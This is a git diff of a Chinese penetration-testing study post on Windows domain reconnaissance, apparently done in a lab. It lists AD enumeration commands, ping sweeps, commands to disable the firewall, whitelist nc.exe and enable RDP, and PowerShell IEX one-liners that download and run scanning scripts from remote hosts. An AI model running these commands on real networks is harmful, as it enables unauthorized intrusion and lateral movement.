+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909144558243.png" alt="image-20230909144558243"></p>
 <h3 id="3-7-对比查看”域-域名-”和”登录服务器-域控制器-”的信息是否匹配">3.7 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否匹配</h3>
 <p><code>systeminfo</code></p>
 <p><strong>域名</strong></p>
-<p><img src="image-20230909145055338.png" alt="image-20230909145055338"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909145055338.png" alt="image-20230909145055338"></p>
 <p><strong>域控制器</strong></p>
-<p><img src="image-20230909145142138.png" alt="image-20230909145142138"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909145142138.png" alt="image-20230909145142138"></p>
 <h3 id="3-8-对比查看”工作站域DNS名称-域名-”和”登录域-域控制器-”的信息是否相匹配">3.8 对比查看”工作站域DNS名称(域名)”和”登录域(域控制器)”的信息是否相匹配</h3>
 <p><code>net config workstation	</code></p>
-<p><img src="image-20230909145319693.png" alt="image-20230909145319693"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909145319693.png" alt="image-20230909145319693"></p>
 <h3 id="3-9-查看时间可以找到域控">3.9 查看时间可以找到域控</h3>
 <p><code>net time /domain</code></p>
-<p><img src="image-20230909145333162.png" alt="image-20230909145333162"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909145333162.png" alt="image-20230909145333162"></p>
 <h3 id="3-10-查看域密码策略">3.10 查看域密码策略</h3>
 <p><code>net accounts /domain</code></p>
-<p><img src="image-20230909150815650.png" alt="image-20230909150815650"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909150815650.png" alt="image-20230909150815650"></p>
 <h3 id="3-11-查看当前登录域">3.11 查看当前登录域</h3>
 <p><code>net config workstation</code></p>
-<p><img src="image-20230909150852060.png" alt="image-20230909150852060"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909150852060.png" alt="image-20230909150852060"></p>
 <h3 id="3-12-登录本机的域管理员">3.12 登录本机的域管理员</h3>
 <p><code>net localgroup administrators /domain</code></p>
-<p><img src="image-20230909150937358.png" alt="image-20230909150937358"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909150937358.png" alt="image-20230909150937358"></p>
 <h3 id="3-13-获取域控ip">3.13 获取域控ip</h3>
 <p><code>ping -a xxx.com</code></p>
-<p><img src="image-20230909151005372.png" alt="image-20230909151005372"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909151005372.png" alt="image-20230909151005372"></p>
 <h3 id="3-14-查询域">3.14 查询域</h3>
 <p><code>net view /domain</code></p>
-<p><img src="image-20230909151021573.png" alt="image-20230909151021573"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909151021573.png" alt="image-20230909151021573"></p>
 <h3 id="3-15-查询域内的所有计算机">3.15 查询域内的所有计算机</h3>
 <p><code>net view /domain:HACKER</code></p>
-<p><img src="image-20230909153213712.png" alt="image-20230909153213712"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153213712.png" alt="image-20230909153213712"></p>
 <h3 id="3-16-查询域的所有组（enterprise-admins组权限最大）">3.16 查询域的所有组（enterprise admins组权限最大）</h3>
 <p><code>net group /domain</code></p>
-<p><img src="image-20230909153243216.png" alt="image-20230909153243216"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153243216.png" alt="image-20230909153243216"></p>
 <h3 id="3-17-SPN扫描">3.17 SPN扫描</h3>
 <p><code>setspn -T domain -q /</code></p>
-<p><img src="image-20230909153349165.png" alt="image-20230909153349165"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153349165.png" alt="image-20230909153349165"></p>
 <p>这里我估计应该是没有spn吧</p>
 <h3 id="3-18-查看域管理员的用户组">3.18 查看域管理员的用户组</h3>
 <p><code>net group “domain admins” /domain</code></p>
-<p><img src="image-20230909153432879.png" alt="image-20230909153432879"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153432879.png" alt="image-20230909153432879"></p>
 <h3 id="3-19-查询域系统管理员用户组">3.19 查询域系统管理员用户组</h3>
 <p><code>net group "Enterprise admins" /domain</code></p>
-<p><img src="image-20230909153514033.png" alt="image-20230909153514033"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153514033.png" alt="image-20230909153514033"></p>
 <h3 id="3-20-查看域控制器">3.20 查看域控制器</h3>
 <p><code>net group "domain controllers" /domain</code></p>
-<p><img src="image-20230909153537898.png" alt="image-20230909153537898"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153537898.png" alt="image-20230909153537898"></p>
 <h3 id="3-21-查看域控制器的机器名">3.21 查看域控制器的机器名</h3>
 <p><code>nltest /DCLIST:hacker</code></p>
-<p><img src="image-20230909153553577.png" alt="image-20230909153553577"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153553577.png" alt="image-20230909153553577"></p>
 <h3 id="3-22-查看dns缓存">3.22 查看dns缓存</h3>
 <p><code>ipconfig /displaydns</code></p>
-<p><img src="image-20230909153647070.png" alt="image-20230909153647070"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909153647070.png" alt="image-20230909153647070"></p>
 <h3 id="3-23-列域控c盘文件-需要域管理员权限">3.23 列域控c盘文件(需要域管理员权限)</h3>
 <p><code>dir \\WIN7-TEST.hacker.testlab\c$</code></p>
 <p>这里不知为何我找不到指定的文件，或许是命令错误，找了半天发现是域名前面应该是两条反斜杠</p>
-<p><img src="image-20230909154736190.png" alt="image-20230909154736190"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909154736190.png" alt="image-20230909154736190"></p>
 <h3 id="3-24-查询所有域成员计算机列表">3.24 查询所有域成员计算机列表</h3>
 <p><code>net group "domain computers" /domain</code></p>
-<p><img src="image-20230909154831401.png" alt="image-20230909154831401"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909154831401.png" alt="image-20230909154831401"></p>
 <h3 id="3-25-获取域信任信息">3.25 获取域信任信息</h3>
 <p><code>nltest /domain_trusts</code></p>
-<p><img src="image-20230909154843289.png" alt="image-20230909154843289"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909154843289.png" alt="image-20230909154843289"></p>
 <h3 id="3-26-获取域内用户的详细信息">3.26 获取域内用户的详细信息</h3>
 <p><code>wmic useraccount get /all</code></p>
-<p><img src="image-20230909154900256.png" alt="image-20230909154900256"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909154900256.png" alt="image-20230909154900256"></p>
 <h3 id="3-27-查看存在的用户">3.27 查看存在的用户</h3>
 <p><code>dsquery user</code></p>
-<p><img src="image-20230909155236636.png" alt="image-20230909155236636"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909155236636.png" alt="image-20230909155236636"></p>
 <p>这条命令只能在winserver服务器才能使用</p>
 <h3 id="3-28-查询所有计算机名称">3.28 查询所有计算机名称</h3>
 <p><code>dsquery computer</code></p>
-<p><img src="image-20230909155312203.png" alt="image-20230909155312203"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909155312203.png" alt="image-20230909155312203"></p>
 <h3 id="3-29-攻击主机CMD扫描同网段存活ip">3.29 攻击主机CMD扫描同网段存活ip</h3>
 <p>windows</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 扫c段<br>for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.17.%P | findstr "TTL ="<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none"># 扫c段
+for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.17.%P | findstr "TTL ="<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>Linux</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>NET=10.168.1.<br><span class="hljs-keyword">for</span> IP <span class="hljs-keyword">in</span> {100..115}<br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">if</span> `ping -c2 -i0.2 -w2 $NET<span class="hljs-variable">$IP</span> &amp;&gt; /dev/null`<br><span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"$NET<span class="hljs-variable">$IP</span> is \033[31mup\033[0m"</span> <br><span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"$NET<span class="hljs-variable">$IP</span> is \033[32mdown\033[0m"</span> <br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token assign-left variable">NET</span><span class="token operator">=</span><span class="token number">10.168</span>.1.
+<span class="token keyword">for</span> <span class="token for-or-select variable">IP</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">100</span><span class="token punctuation">..</span><span class="token number">115</span><span class="token punctuation">}</span>
+<span class="token keyword">do</span>
+<span class="token keyword">if</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ping</span> <span class="token parameter variable">-c2</span> <span class="token parameter variable">-i0.2</span> <span class="token parameter variable">-w2</span> $NET$IP <span class="token operator">&amp;&gt;</span> /dev/null<span class="token variable">`</span></span>
+<span class="token keyword">then</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$NET</span><span class="token variable">$IP</span> is <span class="token entity" title="\033">\033</span>[31mup<span class="token entity" title="\033">\033</span>[0m"</span> 
+<span class="token keyword">else</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$NET</span><span class="token variable">$IP</span> is <span class="token entity" title="\033">\033</span>[32mdown<span class="token entity" title="\033">\033</span>[0m"</span> 
+<span class="token keyword">fi</span>
+<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>扫b段</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for i in 192.168.{1..254}.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null;then echo $i is alived; fi; done<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">for i in 192.168.{1..254}.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null;then echo $i is alived; fi; done<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="3-30-PowerView-ps域内信息收集">3.30 PowerView.ps域内信息收集</h3>
 <p>Invoke-NetView //查域内环境<br>
 Invoke-ShareFinder //查共享目录<br>
@@ -835,74 +800,85 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 <li>
 <p>关闭防火墙</p>
 <p>Windows Server 2003及之前的版本(admin)：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh firewall set opmode disable<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh firewall set opmode disable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>Windows Server 2003之后的版本(admin)：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall set allprofiles state off<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 <li>
 <p>查看防火墙配置：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh firewall show config<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh firewall show config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 </ol>
-<p><img src="image-20230909162001555.png" alt="image-20230909162001555"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909162001555.png" alt="image-20230909162001555"></p>
 <ol>
 <li>
 <p>修改防火墙配置</p>
 <p>Windows Server 2003及之前的版本，允许指定程序全部连接：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh firewall add allowedprogram c:\nc.exe "allow nc" enable<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh firewall add allowedprogram c:\nc.exe "allow nc" enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>Windows Server 2003之后的版本，情况如下。</p>
 <p>允许指定程序进入：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>允许指定程序退出：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:\nc.exe"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:\nc.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>允许3389端口放行：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>自定义防火墙日志的储存位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 </ol>
 <h3 id="3-33-查询代理配置情况">3.33 查询代理配置情况</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909162103233.png" alt="image-20230909162103233"></p>
+<pre class="line-numbers language-none"><code class="language-none">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909162103233.png" alt="image-20230909162103233"></p>
 <h3 id="3-34-查询并开启远程连接服务">3.34 查询并开启远程连接服务</h3>
 <ol>
 <li>
 <p>查看远程连接端口</p>
 <p>0xd3d转换后就是3389</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 <li>
 <p>在Windows Server 2003中开启3389端口</p>
 </li>
 </ol>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic path win32_terminalservicesetting where (__CLASS !="")  call setallowtsconnections 1<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">wmic path win32_terminalservicesetting where (__CLASS !="")  call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ol start="3">
 <li>在Windows Server 2008和Windows Server 2012中开启3389端口</li>
 </ol>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1<br><br>wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1<br><br>reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
+
+wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1
+
+reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="3-35-端口扫描">3.35 端口扫描</h3>
 <h4 id="1-telnet端口连接">1. telnet端口连接</h4>
 <p>没有开启的话去“打开或关闭windows功能”开启</p>
 <ul>
 <li>telnet只用于确认端口是否开启用，不拿来端口扫描</li>
 </ul>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">telnet &lt;主机&gt; &lt;端口&gt;<br>telnet 192.168.52.138 445<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">telnet &lt;主机&gt; &lt;端口&gt;
+telnet 192.168.52.138 445<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="2-PowerSploit-中的Invoke-portscan-ps1脚本">2. PowerSploit 中的Invoke-portscan.ps1脚本</h4>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
 <p>端口扫描利用到工具包中的<code>Portscan.ps1</code></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/powersploit/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.17.1/24 -T 4 -ports '445,1433,8080,80,3389'"<br><br>// 或者扫描全部的端口：-Ports "1-65535"<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909164333290.png" alt="image-20230909164333290"></p>
+<pre class="line-numbers language-none"><code class="language-none">powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/powersploit/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.17.1/24 -T 4 -ports '445,1433,8080,80,3389'"
+
+// 或者扫描全部的端口：-Ports "1-65535"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909164333290.png" alt="image-20230909164333290"></p>
 <h4 id="3-Nishang中的Invoke-portscan-ps1">3. Nishang中的Invoke-portscan.ps1</h4>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
 <p>该脚本可用于发现主机、解析主机名、扫描端口。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port '1-65535'"<br><br>// -ResolveHost：解析主机名<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909164401808.png" alt="image-20230909164401808"></p>
+<pre class="line-numbers language-none"><code class="language-none">powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port '1-65535'"
+
+// -ResolveHost：解析主机名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909164401808.png" alt="image-20230909164401808"></p>
 <h4 id="4-Nmap扫描">4. Nmap扫描</h4>
 <p>一般通过挂代理，nmap远程扫描</p>
 <p>《内网渗透测试：隐藏通讯隧道技术》</p>
 <h4 id="5-Metasploit-端口扫描模块">5. Metasploit 端口扫描模块</h4>
 <p>Metasploit中提供了很多内置的扫描模块，使用方便，在侵入内网后设置好路由直接扫即可，有时速度有些慢。几个常用的：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auxiliary/scanner/portscan/tcp<br>auxiliary/scanner/portscan/tcp<br>auxiliary/scanner/portscan/ack  <br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">auxiliary/scanner/portscan/tcp
+auxiliary/scanner/portscan/tcp
+auxiliary/scanner/portscan/ack  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="6-收集域内端口的banner信息">6. 收集域内端口的banner信息</h4>
 <p>banner信息表示“欢迎语”，其中会包含一些敏感信息，在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等，而版本号信息有时会存在公开的CVE可以利用。获取到版本号后，可以在中查找到对应的CVE编号，并在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">ExploitDB</a>等平台上面找到相关的利用方式。</p>
 <h4 id="获取Banner">获取Banner</h4>
@@ -1109,20 +1085,23 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 </tbody>
 </table>
 <h4 id="7-使用Nmap获取banner">7. 使用Nmap获取banner</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap &lt;IP地址&gt; --script=banner -p &lt;端口/端口范围&gt;<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909165322963.png" alt="image-20230909165322963"></p>
+<pre class="line-numbers language-none"><code class="language-none">nmap &lt;IP地址&gt; --script=banner -p &lt;端口/端口范围&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909165322963.png" alt="image-20230909165322963"></p>
 <p>我这里没banner，就借用图片了</p>
 <h4 id="8-使用nc获取banner">8. 使用nc获取banner</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -nv &lt;IP地址&gt; &lt;端口&gt;<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909165400049.png" alt="image-20230909165400049"></p>
+<pre class="line-numbers language-none"><code class="language-none">nc -nv &lt;IP地址&gt; &lt;端口&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909165400049.png" alt="image-20230909165400049"></p>
 <h3 id="3-36-存活主机扫描">3.36 存活主机扫描</h3>
 <h4 id="nbtscan">nbtscan</h4>
 <p>nbtscan.exe是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。</p>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/MrAnonymous-1/nbtscan">https://github.com/MrAnonymous-1/nbtscan</a></p>
 <p>将nbtscan.exe上传到目标主机上，然后直接输入ip段即可运行扫描：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//扫描一个网段<br>nbtscan-1.0.35.exe 192.168.17.0/24<br>//扫描两个网段<br>nbtscan.exe 192.168.1.0/24 192.168.2.0/24<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909165437963.png" alt="image-20230909165437963"></p>
-<p><img src="image-20230909170645739.png" alt="image-20230909170645739"></p>
+<pre class="line-numbers language-none"><code class="language-none">//扫描一个网段
+nbtscan-1.0.35.exe 192.168.17.0/24
+//扫描两个网段
+nbtscan.exe 192.168.1.0/24 192.168.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909165437963.png" alt="image-20230909165437963"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909170645739.png" alt="image-20230909170645739"></p>
 <p>参数解释：</p>
 <ul>
 <li>SHARING：该主机存在正在运行的文件和打印共享服务</li>
@@ -1131,40 +1110,56 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 </ul>
 <h4 id="ping">ping</h4>
 <p>基于icmp扫描内网</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.17.%I | findstr "TTL="<br>//兼容win7<br>for /l %i in (1,1,254) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i "Ping"<br>//扫b段<br>for /l %i in (1,1,254) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i "Ping"<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909170827618.png" alt="image-20230909170827618"></p>
+<pre class="line-numbers language-none"><code class="language-none">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.17.%I | findstr "TTL="
+//兼容win7
+for /l %i in (1,1,254) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i "Ping"
+//扫b段
